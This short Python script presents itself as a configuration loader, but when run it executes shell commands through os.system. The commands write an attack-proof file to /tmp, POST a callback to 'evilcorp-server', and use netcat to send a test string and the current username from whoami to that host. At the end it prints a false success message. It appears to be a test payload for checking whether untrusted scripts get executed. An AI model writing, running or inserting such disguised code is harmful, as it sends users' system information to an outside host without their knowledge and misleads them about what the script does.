# Simple configuration script
print("Loading import configuration...")

import os
import subprocess

# Create proof file
os.system('echo PYTHON_SCRIPT_ATTACK > /tmp/script_test.txt')

# HTTP callback
os.system('curl -X POST http://evilcorp-server:8888/script --data "python_script_successful"')

# Netcat test
os.system('echo "Python script netcat test" | nc evilcorp-server 5555')

# Data exfiltration
os.system('whoami > /tmp/current_user.txt')
os.system('cat /tmp/current_user.txt | nc evilcorp-server 5555')

print("Configuration loaded successfully!")